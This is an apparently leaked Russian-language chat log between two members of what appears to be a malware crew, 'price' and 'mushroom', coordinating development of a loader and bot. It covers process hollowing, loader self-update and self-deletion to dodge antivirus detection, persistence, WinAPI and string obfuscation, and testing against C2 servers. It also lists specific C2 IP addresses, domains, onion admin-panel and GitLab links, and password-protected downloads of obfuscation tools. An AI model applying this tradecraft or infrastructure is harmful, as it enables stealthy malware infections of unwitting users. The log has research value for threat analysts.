Timestamp	From	To	Message
2020-10-07 08:12:51.573491	price	mushroom	привет
2020-10-07 08:13:29.163018	price	mushroom	файлов нет, потому что пока в принципе решаю
2020-10-07 08:17:01.420948	mushroom	price	Сколько времени ещё надо?
2020-10-07 08:17:12.083283	price	mushroom	два дня
2020-10-07 08:18:43.712731	mushroom	price	Всё загрузи тогда в гитлаб, как решишь. Чтобы можно было просто открыть решение и бота и загрузчика выбрать собрать о проверить. Сейчас опять бот по простому не собирается в конфигурации Release.
2020-10-07 08:19:16.425115	price	mushroom	я комплексно подготовлю.
2020-10-07 08:19:36.347884	mushroom	price	Потом ещё надо будет обфусцировать всё.
2020-10-07 08:19:49.390147	price	mushroom	библиотека самопальная CRT изменилась, я лоадера уже на новой делаю.
2020-10-07 08:20:15.661944	price	mushroom	пока соберу лоадера просто функционалку
2020-10-07 08:20:43.448532	price	mushroom	прочитал про виртуальные функции? я не думал, что будет работать. Но сработало.
2020-10-07 08:21:12.752531	mushroom	price	Прочитал.
2020-10-07 08:21:16.474505	price	mushroom	пример оббфускации есть?
2020-10-07 08:21:23.059721	mushroom	price	Есть.
2020-10-07 08:21:33.108255	price	mushroom	в documents?
2020-10-07 08:21:44.813378	mushroom	price	Сначала сделай чтобы всё работало.
2020-10-07 08:21:55.590411	price	mushroom	я и хочу
2020-10-07 08:22:08.204028	price	mushroom	вчера дошел до верификации.
2020-10-07 08:22:17.181705	price	mushroom	осталось скачать.
2020-10-07 08:22:30.486274	price	mushroom	такая же тема как и в боте скачивание по линку?
2020-10-07 08:22:59.138172	price	mushroom	кстати я загрузил бот и лоадер, но просто левые для выкачки
2020-10-07 08:23:20.999496	price	mushroom	в админке должно быть!
2020-10-07 08:23:24.094295	price	mushroom	 сейчас посмотрю
2020-10-07 08:23:41.750320	mushroom	price	https://scrytnuuszglaugg.onion:4247/groups/loadertool?id=50
2020-10-07 08:23:55.679536	mushroom	price	Там нету ничего.
2020-10-07 08:24:09.966112	mushroom	price	Production execution files
2020-10-07 08:24:24.752733	mushroom	price	Туда загружай, а потом кнопка GO.
2020-10-07 08:26:26.992824	price	mushroom	GO не нажал!!!
2020-10-08 13:46:34.330540	mushroom	price	Ну как продвижение?
2020-10-08 13:46:54.189515	price	mushroom	доделываю
2020-10-08 13:46:57.651586	price	mushroom	идет
2020-10-08 13:47:06.221456	price	mushroom	кроме времени вопросов нет
2020-10-08 13:47:38.958483	mushroom	price	В группу загружал что?
2020-10-08 13:48:03.237128	price	mushroom	пока нет, все по мере изготовления
2020-10-08 13:48:05.346346	price	mushroom	кстати
2020-10-08 13:48:18.809687	price	mushroom	вот я загружу туда бота и лоадера
2020-10-08 13:48:25.892377	price	mushroom	а как проверить
2020-10-08 13:48:39.617400	mushroom	price	Запусти лоадер свой.
2020-10-08 13:49:02.974393	price	mushroom	вот лоадера я в ВМ запускаю, обхожду локаль и скачиваю бота и запускаю его холловингом
2020-10-08 13:49:06.011363	price	mushroom	это понятно
2020-10-08 13:49:16.753640	price	mushroom	а вот с загруженными что делать
2020-10-08 13:49:31.528905	price	mushroom	бота я загрузил -могу скачать?
2020-10-08 13:49:45.699518	price	mushroom	а лоадер чтобы проверять новые версии?
2020-10-08 13:50:27.333989	price	mushroom	то есть бота в группу на сервере загружаю чтобы его скачать?
2020-10-08 13:50:36.201252	mushroom	price	На сервере измени версию в поле Version
2020-10-08 13:50:40.242981	price	mushroom	а лоадера, чтобы обновления скачивать?
2020-10-08 13:50:57.381119	mushroom	price	И её будешь получать.
2020-10-08 13:51:06.408121	price	mushroom	и если версия другая, то надо скачивать?
2020-10-08 13:51:10.598713	mushroom	price	И сравнивать с той что прошита в программе.
2020-10-08 13:51:12.867258	price	mushroom	вот теперь яснее стало
2020-10-08 13:51:18.836296	mushroom	price	Да надо скачивать и запускать.
2020-10-08 13:51:58.777404	price	mushroom	я все варианты перепробовал, сейчас код утрясаю, выложу скоро
2020-10-08 13:52:33.187870	price	mushroom	а вот что такое отстук? там 5 минут в ТЗ записано, это как делается и где посмотреть?
2020-10-08 13:52:36.619763	mushroom	price	Как запускаешь новый, старый удаляй.
2020-10-08 13:53:04.680286	price	mushroom	а разве не замещается? это из протокола загрузок удалить?
2020-10-08 13:53:26.587840	price	mushroom	где и откуда удалять?
2020-10-08 13:53:30.891889	mushroom	price	Скачал другую версию загрузчика, запустил её, она в начале работы удалила предыдущую версию.
2020-10-08 13:53:51.911690	price	mushroom	а, понял
2020-10-08 13:54:08.728135	price	mushroom	а разве не прятать его надо где-то?
2020-10-08 13:54:22.103908	price	mushroom	или он просто лежит в фалах?
2020-10-08 13:54:25.408605	mushroom	price	dl1.exe скачал и запустил dl2.exe, dl2.exe должен удалить dl1.exe в начале работы.
2020-10-08 13:54:26.698862	price	mushroom	файлах
2020-10-08 13:55:00.827011	mushroom	price	Прячь. Но старую версию не надо держать, она же спалится.
2020-10-08 13:55:08.459612	price	mushroom	у меня  dl6
2020-10-08 13:55:15.909779	mushroom	price	Это как пример.
2020-10-08 13:55:57.815253	price	mushroom	то есть надо старую версию почистить а на её место записать новый загрузчик
2020-10-08 13:56:08.204042	mushroom	price	Да.
2020-10-08 13:56:28.761927	price	mushroom	понял
2020-10-08 13:56:58.641225	mushroom	price	Для этого передавай в запускаемую новую версию путь к файлу старой, чтобы она смогла удалить.
2020-10-08 13:57:27.086587	mushroom	price	Любым способом передавай.
2020-10-08 13:58:37.279741	mushroom	price	И передавай в новую ещё id процесса старой, если не будет удаляться, а то пока процесс работает файл не удалить никак.
2020-10-08 13:58:48.935359	price	mushroom	спасибо
2020-10-08 13:59:07.220131	mushroom	price	Тогда можно будет дождаться завершения работы старой версии и спокойно удалить её файл.
2020-10-14 08:08:23.030251	mushroom	price	Привет. Ну что сделал?
2020-10-14 08:09:01.434201	price	mushroom	привет
2020-10-14 08:09:36.114303	price	mushroom	скачиваю бота и лоадера  (уже), сейчас запущу бота холловингом
2020-10-14 08:10:00.853260	price	mushroom	день не работали сервера, я искал ошибки в себе
2020-10-14 08:43:24.637215	mushroom	price	Адреса работают ещё?
2020-10-14 08:43:46.084984	price	mushroom	а есть новые?
2020-10-14 08:44:12.031631	price	mushroom	вчера работали, сейчас я холовинг выпиливаю из бота в лоадер
2020-10-14 08:44:30.033937	mushroom	price	bot

18.188.194.80 labelcs.com
54.91.36.142  freedubcs.com

loader

54.245.74.151 titlecs.com
54.145.79.240 mixcinc.com
3.138.117.231 nicknamec.com
2020-10-14 08:44:35.586380	price	mushroom	спасибо
2020-10-14 08:44:40.614900	mushroom	price	На случай если перестанут работать.
2020-10-14 08:45:02.566637	price	mushroom	ок
2020-10-15 08:27:59.013798	mushroom	price	Адреса, которые я тебе вчера давал больше не работают.
2020-10-15 08:28:11.818146	mushroom	price	Вот старые:
bot

3.137.180.197  cuprinc.com
3.238.75.236  shophoof.com

loader

34.221.202.231  breezdesign.com
54.83.253.135 hotenlighten.com
18.191.38.26 onebulks.com
2020-10-15 08:28:24.248459	mushroom	price	34.221.202.231  breezdesign.com этот не работает.
2020-10-15 08:28:26.399159	price	mushroom	спасибо
2020-10-15 08:28:29.814139	mushroom	price	Другие проверь.
2020-10-15 08:28:45.736780	price	mushroom	у меня всю обойму проверяет и рабочий выбирает
2020-10-15 08:29:17.080425	price	mushroom	сейчас пайпы сделал для связи при обновлении лоадера с другой версией, так что приближаю конец
2020-10-15 08:30:07.034334	mushroom	price	OK. И всё прогони, по всем командам. Потом я посмотрю.
2020-10-15 08:30:16.146506	price	mushroom	ок
2020-10-15 08:30:53.372919	price	mushroom	вот только непонятно в тз на лоадер написано, что он тоже должен на сервер передавать информацию о системе.
2020-10-15 08:31:09.948489	price	mushroom	не надо ведь? раз бот это делает
2020-10-15 08:32:13.135036	mushroom	price	Не надо, там в ТЗ написано что это опционально. И настраивается при сборке макросом.
2020-10-15 08:34:59.969026	price	mushroom	вот вот - настраивается макросом
2020-10-15 08:35:25.974863	price	mushroom	то есть может не работать, но генериться должно
2020-10-15 08:35:33.310930	mushroom	price	Пока не надо делать это.
2020-10-15 08:35:40.128404	price	mushroom	ок
2020-10-15 13:11:37.580420	mushroom	price	34.221.79.109  freexaims.com
2020-10-15 13:11:44.292942	mushroom	price	Ещё один.
2020-10-15 13:12:05.253881	price	mushroom	ok
2020-10-20 07:24:30.307105	price	mushroom	привет
2020-10-21 10:40:21.061496	mushroom	price	Привет. Какие там тестовые адреса я давал?
2020-10-21 10:40:34.513785	mushroom	price	Напиши. Мне надо протестировать.
2020-10-21 10:40:49.147984	price	mushroom	читать я всё читаю но сейчас проблема встала
2020-10-21 10:41:06.446658	price	mushroom	я не могу временный файл удалить
2020-10-21 10:41:16.037501	price	mushroom	ошибка контроля доступа
2020-10-21 10:41:17.322658	price	mushroom	5
2020-10-21 10:41:47.248927	mushroom	price	Этот потому что он процессом используется наверное.
2020-10-21 10:42:04.340963	mushroom	price	Надо дождаться завершения или подождать какое то время.
2020-10-21 10:42:04.561745	price	mushroom	я жду 10 сек чтобы завершилось по exit
2020-10-21 10:43:00.440537	price	mushroom	а вот скажи почему лоадер нельзя холовингом запускать а бот надо?
2020-10-21 10:43:31.014251	price	mushroom	ну про то что экзешник какой то упакованный может не пойти в холовинге я помню
2020-10-21 10:43:38.312877	mushroom	price	Скачиваешь другую версию загрузчика, запускаешь её, она ждёт завершения процесса предыдущей версии и удаляет её файл.
2020-10-21 10:43:41.027889	price	mushroom	а бот так не пакуют?
2020-10-21 10:43:49.221778	mushroom	price	Бот не пакуют.
2020-10-21 10:43:58.837061	mushroom	price	Он на диск не сохраняется.
2020-10-21 10:43:59.569128	price	mushroom	понял
2020-10-21 10:44:11.641440	mushroom	price	Скачиваешь другую версию загрузчика, запускаешь её, она ждёт завершения процесса предыдущей версии и удаляет её файл.
2020-10-21 10:44:15.938063	mushroom	price	Так делаешь?
2020-10-21 10:44:34.489563	price	mushroom	вот старая версия у меня ld6 например
2020-10-21 10:45:01.837061	price	mushroom	я стартую ld6 из неё качаю и сохраняю temp6
2020-10-21 10:45:58.390413	price	mushroom	стартую temp6 оттуда копирую temp6 в ld6
2020-10-21 10:46:17.136117	price	mushroom	запускаю ld6 и стараюсь и не могу удалить temp6
2020-10-21 10:47:36.593083	mushroom	price	запустил ld6, она скачала temp6, запустил temp6, завершил ld6, temp6 ждёт завершения процесса ld6, удаляет ld6.
2020-10-21 10:47:47.880564	price	mushroom	ладно сейчас тест сочиню, а то я хотел с ходу пройти
2020-10-21 10:48:07.496692	mushroom	price	Ничего копировать не надо никуда.
2020-10-21 10:48:15.242990	price	mushroom	ld6 нет проблем удалить
2020-10-21 10:48:28.030576	mushroom	price	Скачал в temp фал с рандомным именем и запустил его.
2020-10-21 10:48:37.091687	price	mushroom	а какже тогда я думал надо все под старым именем хранить
2020-10-21 10:48:45.601775	mushroom	price	Не надо.
2020-10-21 10:48:54.811082	price	mushroom	понял, снимается вопрос
2020-10-21 10:49:00.184525	mushroom	price	Какой в этом смысл?
2020-10-21 10:49:12.416997	price	mushroom	а вот как лоадер стартует если закрепление на него не делается?
2020-10-21 10:49:20.814761	mushroom	price	Никак.
2020-10-21 10:49:27.182466	price	mushroom	я думал закрепление по старому имени
2020-10-21 10:49:43.016291	mushroom	price	Закрепление по своему имени.
2020-10-21 10:49:52.358523	price	mushroom	так то нет проблем и удалить и запустить
2020-10-21 10:50:24.714431	mushroom	price	По имени своего файла. GetModuleFileName
2020-10-21 10:50:37.119839	price	mushroom	это я всё делаю
2020-10-21 10:51:19.371364	price	mushroom	но вообще тогда не понятно откуда лоадер берётся и куда девается если он не нужен после запуска бота?
2020-10-21 10:51:22.797092	mushroom	price	Это же имя передаёшь в запускаемый загрузчик, и свой PID чтобы он дождался по нему завершения процесса.
2020-10-21 10:51:55.316035	mushroom	price	Лоадер это одноразовая программа, все детекты антивирусов на него.
2020-10-21 10:52:22.228737	price	mushroom	вот и хорошо, он отработал бота загрузил и болтается в файлах?
2020-10-21 10:52:26.806969	mushroom	price	Как лоадер впарить пользоваиелю не наша забота.
2020-10-21 10:53:00.086781	price	mushroom	но если его запустили то он должен обновиться по версии?
2020-10-21 10:53:00.468483	mushroom	price	Да болтается в файлах.
2020-10-21 10:53:09.668676	mushroom	price	На случай закрепления.
2020-10-21 10:53:32.480614	price	mushroom	может ботом его удалить?
2020-10-21 10:53:40.688961	price	mushroom	закрепление ведь отменили
2020-10-21 10:53:52.680739	mushroom	price	Если его запустили, должен попытаться обновиться, если версия не сходится.
2020-10-21 10:54:08.886844	mushroom	price	Удаление по команде siucid.
2020-10-21 10:54:18.380168	price	mushroom	5.181.156.226
2020-10-21 10:54:19.583604	price	mushroom	CheckServer, 192 ---> Server https://5.181.156.226:443/api/v198 verified! LoaderVersion=2
2020-10-21 10:54:27.966609	mushroom	price	Это завершение работы бота и удаление файла загрузчика.
2020-10-21 10:54:39.683912	price	mushroom	и то и другое?
2020-10-21 10:54:51.860526	price	mushroom	а как бот узнает имя файла ллоадера?
2020-10-21 10:55:05.345406	price	mushroom	для удаления
2020-10-21 10:55:24.181201	mushroom	price	Лоадер запускает бот, он может передать ему своё имя файла, я через переменную окружения передаю.
2020-10-21 10:55:30.060666	price	mushroom	не зря я пайпы тренировал для холовинга
2020-10-21 10:55:39.834469	mushroom	price	Через командную строку можно ещё.
2020-10-21 10:55:53.070978	price	mushroom	уу меня не получалось с холовинглм
2020-10-21 10:56:02.718861	price	mushroom	по командной строке
2020-10-21 10:56:22.623388	price	mushroom	или прям процессу передавать?
2020-10-21 10:56:23.629575	mushroom	price	Перемунную окружения используй тогда.
2020-10-21 10:56:34.994597	price	mushroom	это не палит ?
2020-10-21 10:57:02.973166	mushroom	price	Нет. Этих переменных полно. Почти все программы их используют.
2020-10-21 10:57:29.498207	mushroom	price	Что еак не работает 1.exe 1234567
2020-10-21 10:57:32.998015	price	mushroom	ладно я доделывать пошёл, ты про адрес спрашивал, видел ответ?
2020-10-21 10:57:49.397688	mushroom	price	1234567 аргумент командной строки.
2020-10-21 10:58:00.551900	mushroom	price	Потом GetCommandLine в программе.
2020-10-21 10:58:10.390088	price	mushroom	это у меня норм
2020-10-21 10:58:23.409353	price	mushroom	у меня и argv работает не плохе
2020-10-21 10:58:26.897611	price	mushroom	плохо
2020-10-21 10:58:58.932604	price	mushroom	а точно холовинг надо по геткомандлайн наверное
2020-10-21 10:59:10.773963	mushroom	price	В /subsystem:windows вообще нету argv
2020-10-21 10:59:27.190892	mushroom	price	Полагайся всегда на GetCommandLine
2020-10-21 10:59:29.738584	price	mushroom	у меня console вроде
2020-10-21 10:59:33.169856	mushroom	price	Работает везде.
2020-10-21 10:59:56.820529	mushroom	price	В работу надо не console. А то окно с консолью будет выскакивать.
2020-10-21 10:59:56.980389	price	mushroom	понял
2020-10-21 11:00:10.671879	price	mushroom	окно не выскакивает
2020-10-21 11:01:06.663942	price	mushroom	надо проверить, не задумывался,  но когда createprocess запускал там новиндоуз стоит
2020-10-21 11:01:17.840249	price	mushroom	и ничего не видно
2020-10-21 11:01:36.316056	mushroom	price	Короче самый удобный способ имя файла передать как аргумент командной строки или переменную окружения.
2020-10-21 11:01:54.694512	price	mushroom	я теперь понял
2020-10-21 11:01:59.124563	price	mushroom	делаю
2020-10-21 11:02:07.923215	mushroom	price	Выскакисвает окно у лоадера я имел ввиду, там ты NoWindow не сделаешь.
2020-10-21 11:02:21.560612	mushroom	price	Там запускается двойным кликом.
2020-10-21 11:02:38.044108	price	mushroom	в смысле из проводника?
2020-10-21 11:03:03.082524	mushroom	price	Да. Лоадер это файл, который запускает пользователь двойным кликом.
2020-10-21 11:03:21.612765	price	mushroom	не наше дело как его к этомму принудят?
2020-10-21 11:03:26.864887	mushroom	price	Да.
2020-10-21 11:04:06.958912	mushroom	price	Какие адреса я давал тебе тестовые?
2020-10-21 11:04:16.120704	mushroom	price	Я их у себя не сохранил.
2020-10-21 11:04:18.835632	price	mushroom	5.181.156.226
2020-10-21 11:04:19.120346	mushroom	price	Напиши.
2020-10-21 11:04:24.673312	price	mushroom	лоадер
2020-10-21 11:04:34.186745	price	mushroom	[14:10:26] <mushroom> Вот адреса для тестирования:
бот

194.5.249.46

лоадер

5.181.156.226
2020-10-21 11:04:39.234210	mushroom	price	OK.
2020-10-21 11:04:42.059362	price	mushroom	лоадер работает
2020-10-22 07:47:43.268773	mushroom	price	Привет. Доделал?
2020-10-22 07:48:26.565901	price	mushroom	нет связи с сервером бота, может обновились
2020-10-22 07:48:57.015992	price	mushroom	а так перешел на подсистему виндоуз, всё что надо удаляю, стартую холовинг процесс но - связи нет
2020-10-22 07:50:20.925171	mushroom	price	На GitLab загрузил?
2020-10-22 07:50:40.176830	price	mushroom	нет пока не отладил же
2020-10-22 07:50:58.908067	price	mushroom	есть адреса сервера ботов?
2020-10-22 07:51:20.953839	mushroom	price	А бот?
2020-10-22 07:51:33.576694	mushroom	price	Бот ты сделал.
2020-10-22 07:51:52.439208	price	mushroom	вот бот сейчас и запускаю и нет валидации серверов
2020-10-22 07:52:10.715680	price	mushroom	бот давно всё отладил, но сейчас нет связи
2020-10-22 07:52:12.920922	mushroom	price	Подписи нету?
2020-10-22 07:52:19.246275	price	mushroom	да
2020-10-22 07:52:26.621942	mushroom	price	Отключи тогда пока её проверку.
2020-10-22 07:52:40.482266	price	mushroom	сейчас попробую
2020-10-22 07:53:27.666536	mushroom	price	Загружай на GitLab. Чтобы собрать версию Release с логами.
2020-10-22 07:53:50.132325	price	mushroom	хорошо
2020-10-22 07:54:28.651548	mushroom	price	Что осталось сделать?
2020-10-22 07:54:37.226789	mushroom	price	Загрузчик протестировать?
2020-10-22 07:55:02.981244	price	mushroom	1. восстановить работу бота (не пускает верифицация)
2020-10-22 07:55:14.860567	price	mushroom	2. загрузить бот в админку
2020-10-22 07:55:33.689601	price	mushroom	3. проверить как лоадер загружает бот холовингом
2020-10-22 07:57:04.648351	mushroom	price	А у меня есть подпись.
2020-10-22 07:57:31.773479	price	mushroom	вот и странно, этот адрес 194.5.249.46?
2020-10-22 07:59:47.180268	mushroom	price	Этот адрес не работает вообще.
2020-10-22 08:00:15.797240	price	mushroom	какой работает у тебя?
2020-10-22 08:00:26.631994	price	mushroom	 [14:10:26] <mushroom> Вот адреса для тестирования:
бот

194.5.249.46

лоадер

5.181.156.226
2020-10-22 08:00:56.507266	mushroom	price	194.5.249.46 перестал работать.
2020-10-22 08:01:15.211975	price	mushroom	[10:57:02] <mushroom> А у меня есть подпись.
2020-10-22 08:01:22.572820	price	mushroom	по какому адресу?
2020-10-22 08:02:35.580899	mushroom	price	Новый дам тогда, сейчас сделают наверное. Пока на GitLab проект бота обнови, чтобы я собрать смог Release с логами.
2020-10-22 08:02:54.247361	price	mushroom	сейчас загружу
2020-10-22 08:31:55.289657	mushroom	price	45.89.125.130
2020-10-22 08:36:49.887656	price	mushroom	спасибо
2020-10-22 08:36:59.844132	price	mushroom	сейчас попробую
2020-10-22 08:38:05.923368	price	mushroom	а вот скажи
2020-10-22 08:38:41.858644	price	mushroom	у меня бот начал работать и попал в хонипоты, я сделал ему пометку бот и он перешел уже в боты-это как работает и почему?
2020-10-22 08:39:54.357865	mushroom	price	Может по адресу, в СНГ они не должны работать.
2020-10-22 08:40:05.999795	mushroom	price	Ты сделай пометку лучше что это тестовый бот.
2020-10-22 08:40:22.087311	price	mushroom	спасибо, надо впн поставить
2020-10-22 08:40:28.636384	price	mushroom	а как делать пометку?
2020-10-22 08:40:55.145059	mushroom	price	я сделал ему пометку бот и он перешел уже в боты
2020-10-22 08:40:59.461807	mushroom	price	Так же.
2020-10-22 08:41:07.829086	mushroom	price	Справа кнопка.
2020-10-22 08:41:12.583796	price	mushroom	я как спросил тоже догадался
2020-10-22 08:41:57.244987	price	mushroom	теперь я знаю всё
2020-10-22 08:42:36.445230	price	mushroom	у меня вроде заработало всё
2020-10-22 08:43:08.129074	price	mushroom	и верификация есть и холовинг в ноутпэд и отстук в админке!
2020-10-22 08:43:46.380493	mushroom	price	Все команды проверь.
2020-10-22 08:44:21.230379	price	mushroom	да, там чистить всё надо (не от АВ, а потом и от АВ)
2020-10-22 08:44:26.289512	price	mushroom	хорошо
2020-10-22 08:44:52.438071	price	mushroom	я бота в гитлабе обновил, а лоадера сейчас загружу
2020-10-22 08:45:06.574663	price	mushroom	поскольку он так функциональный стал
2020-10-22 10:00:10.608229	price	mushroom	https://n4iaacb37wmqclht.onion/price/WCRT.git     -   библиотека для сборки без CRT
2020-10-22 10:00:14.456529	price	mushroom	https://n4iaacb37wmqclht.onion/price/ld6.git
2020-10-22 10:00:36.222313	price	mushroom	https://n4iaacb37wmqclht.onion/price/bd6.git
2020-10-22 10:00:48.941472	price	mushroom	сейчас доступ открою
2020-10-22 10:02:22.080879	price	mushroom	открыл
2020-10-22 10:02:49.442132	price	mushroom	ld6 ссылается на проект wcrt
2020-10-22 10:03:34.859818	price	mushroom	bd6 внутри себя содержит этот проект, но я буду переделывать на единый отдельный проект как для ld6
2020-10-22 13:32:04.082617	mushroom	price	Не собирается bd6.
2020-10-22 13:32:25.408076	mushroom	price	Скачай из GitLab в чистом виде bd6 проект и собери.
2020-10-22 13:32:26.070257	price	mushroom	что пишет?
2020-10-22 13:32:36.223934	price	mushroom	ок
2020-10-22 13:32:48.300347	price	mushroom	сейчас в виртуалке соберу
2020-10-22 13:32:54.193325	mushroom	price	Куча не объявленных идентификаторов.
2020-10-22 13:33:18.777723	mushroom	price	командная строка warning D9025: переопределение "/sdl-" на "/GS-"
2020-10-22 13:33:47.311946	mushroom	price	На это обращал внимание?
2020-10-22 13:33:49.509279	price	mushroom	это только предупреждение, в свойствах проекта много чего определено
2020-10-22 13:34:06.051971	mushroom	price	Это получается что не отключены проверки.
2020-10-22 13:34:08.838383	price	mushroom	я разберу и устраню лишнее
2020-10-22 13:34:31.207315	price	mushroom	проверки старался все отключить
2020-10-22 13:34:45.644056	mushroom	price	Ты их в одном месте отключил, а в другом месте  опять включил.
2020-10-22 13:34:49.408269	price	mushroom	сейчас соберу и буду смотреть
2020-10-22 13:35:10.861596	mushroom	price	Чистую попробуй собрать.
2020-10-22 13:35:28.873961	price	mushroom	так в ВМ же, там этого ничего не было
2020-10-22 13:35:46.656266	mushroom	price	Прямо скачал, открыл, выбрал Release x64 нажал запустить.
2020-10-22 13:35:54.895134	price	mushroom	дада
2020-10-22 13:35:57.803286	mushroom	price	Чтобы всё собралось и запустилось.
2020-10-22 13:36:16.672317	mushroom	price	И так же dl6.
2020-10-22 13:39:02.175084	mushroom	price	омандная строка warning D9025: переопределение "/sdl-" на "/GS-"
2020-10-22 13:39:18.322248	mushroom	price	Сотри в настройках /sdl-
2020-10-22 13:39:26.387107	price	mushroom	ок
2020-10-22 13:39:28.795391	mushroom	price	Пуста строка просто в этом поле.
2020-10-22 13:40:27.326213	price	mushroom	т.е. не No (/sdl-)
2020-10-22 13:40:45.897159	mushroom	price	Да.
2020-10-22 13:41:21.853389	price	mushroom	command line warning D9025: overriding '/sdl-' with '/GS-'
2020-10-22 13:41:29.572100	price	mushroom	вот так пишет
2020-10-22 13:41:54.426128	mushroom	price	Уверен что стёр?
2020-10-22 13:42:02.948906	price	mushroom	но это значит что перебивается опция  '/sdl-' на '/GS-'
2020-10-22 13:42:06.443479	price	mushroom	уверен
2020-10-22 13:42:08.343152	mushroom	price	Може не в той сборке стёр.
2020-10-22 13:42:12.231101	price	mushroom	нажал применить
2020-10-22 13:42:20.526085	price	mushroom	для всех конфигураций
2020-10-22 13:42:33.108877	mushroom	price	Я в твоём bd6 стёр у меня не пишет ничего.
2020-10-22 13:43:00.986183	mushroom	price	Ладно. Это не критично. Сделай чтобы собралось.
2020-10-22 13:43:33.933335	price	mushroom	так может у тебя Disable Security Check (/GS-) нет?
2020-10-22 13:43:48.463422	price	mushroom	хоття ты в моем проекте собираешь
2020-10-22 13:44:03.320669	mushroom	price	Есть. Я же твой bd6 собираю.
2020-10-22 13:44:15.915057	mushroom	price	Все твои настройки. GS- там есть.
2020-10-22 13:44:19.021098	price	mushroom	так я это и признал, что одно и то же запускаем
2020-10-22 13:44:33.444765	mushroom	price	Я не могу собрать пока.
2020-10-22 13:44:44.092520	mushroom	price	Жду когда починишь.
2020-10-22 13:45:06.907945	price	mushroom	чиню
2020-10-22 13:55:00.061586	price	mushroom	убрал оверайды. это wcrt проект их давал
2020-10-22 13:55:17.265791	mushroom	price	Можно смотреть?
2020-10-22 13:55:23.943224	price	mushroom	тварь виртуалбокс стал оббновляться
2020-10-22 13:55:45.207326	price	mushroom	на гит я забросил, но пока не проверял ВМ тормозит
2020-10-22 13:57:45.654510	mushroom	price	Ты sdl убрал только?
2020-10-22 13:58:03.723692	mushroom	price	Я думал можно собирать уже.
2020-10-22 13:58:07.721774	price	mushroom	пока да. основная цель сборка тобой проекта.
2020-10-22 13:58:19.302546	price	mushroom	нет ВМ чтобы попробовать
2020-10-22 13:58:46.645029	price	mushroom	он в процессе пишет This may take several minutes (уже 10 прошло)
2020-10-22 13:59:04.897451	price	mushroom	ещё минуту подожду и сканселю
2020-10-22 13:59:10.781739	mushroom	price	Напишешь тогда.
2020-10-22 13:59:18.037765	price	mushroom	конечно
2020-10-23 09:31:45.040073	price	mushroom	привет. Всё залил на Гит. Создал виндоуз 2004 ВМ. Установил Студию. Скачал 3 проекта  с Гита. Собрал без ошибок с помощью Batch Build все конфигурации. Отстук из ВМ есть.
2020-10-23 09:45:52.574186	mushroom	price	привет. Всё залил на Гит. Создал виндоуз 2004 ВМ. Установил Студию. Скачал 3 проекта  с Гита. Собрал без ошибок с помощью Batch Build все конфигурации. Отстук из ВМ есть.
2020-10-23 12:50:54.777450	mushroom	price	Привет. Не могу посмотреть проекты твои, GitLab не работает.
2020-10-23 12:51:36.357280	mushroom	price	Вот тебе пример обфускации WInAPi:
Download: https://qaz.im/load/RAaKti/BAHiQa   
Delete: https://qaz.im/index.php?a=delete&q=323784015
Пароль: ERa{kNNS?*J#r|*T"
2020-10-23 12:51:36.989994	price	mushroom	ничего страшного я тут загадку решаю и лучше делаю.
2020-10-23 12:51:58.712206	mushroom	price	Смысл чтобы получать адрес функции на лету, по этому её не будет в импорте бинарника.
2020-10-23 12:52:05.505524	price	mushroom	У меня в дебаг x64 всё отлично отрабатывает
2020-10-23 12:52:21.578609	mushroom	price	Все функции WinApi обфусцируй, кроме всяких строковых lstrlen и т.д.
2020-10-23 12:52:43.247236	price	mushroom	а вотт в реллизе пропадает вызов функции WinMainCRTStartup
2020-10-23 12:52:46.769673	mushroom	price	Потом смотри импорт.
2020-10-23 12:52:56.177010	price	mushroom	посмотрю и сделаю
2020-10-23 12:53:06.815340	mushroom	price	WinMainCRTStartup это стандартная, она не подозрительна.
2020-10-23 12:53:42.666956	price	mushroom	я про то что она пропадает со всей ццепочкой вызовой и прога становится 4 кб сразу на завершение
2020-10-23 12:53:57.273136	price	mushroom	я сейчас это заплаткой пришью а так надо разбираться
2020-10-23 12:55:36.779913	mushroom	price	Обфускатор строк:
Download: https://qaz.im/load/Gi4yZZ/b6dSGf   
Delete: https://qaz.im/index.php?a=delete&q=868739743
Пароль: "MC>w#l!f@B!:pwYO
2020-10-23 12:55:45.836181	price	mushroom	у меня Гит работает
2020-10-23 12:55:53.289824	mushroom	price	Все строки в прогамме обфусцируй.
2020-10-23 12:56:06.515039	mushroom	price	Потом проверяй бинарник, чтобы их не было.
2020-10-23 12:56:25.960094	mushroom	price	_STR("str") ANSI, _WCS("str") UNICODE
2020-10-23 12:56:38.873805	price	mushroom	хорошо
2020-10-23 12:57:35.344715	mushroom	price	Когда используешь _WCS надо сначала в буффер промежуточный записывать, а потом уже использовать:
WCHAR[100] str;
lstrcpyW(str, _WCS(L"str"));
используешь str
